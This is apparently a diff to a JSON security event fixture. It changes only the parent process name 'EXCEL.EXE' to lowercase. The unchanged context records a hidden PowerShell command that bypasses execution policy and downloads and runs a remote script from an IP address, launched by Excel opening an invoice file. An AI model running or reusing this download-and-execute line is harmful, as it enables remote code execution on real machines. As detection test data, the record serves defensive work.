@@ -30,7 +30,7 @@
         "command_line": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -nop -Command \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')\"",
         "pid": 4532,
         "parent": {
-            "name": "EXCEL.EXE",
+            "name": "excel.exe",
             "executable": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
             "pid": 3248,
             "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\jsmith\\Downloads\\Q3_Invoice_Review.xlsx\""
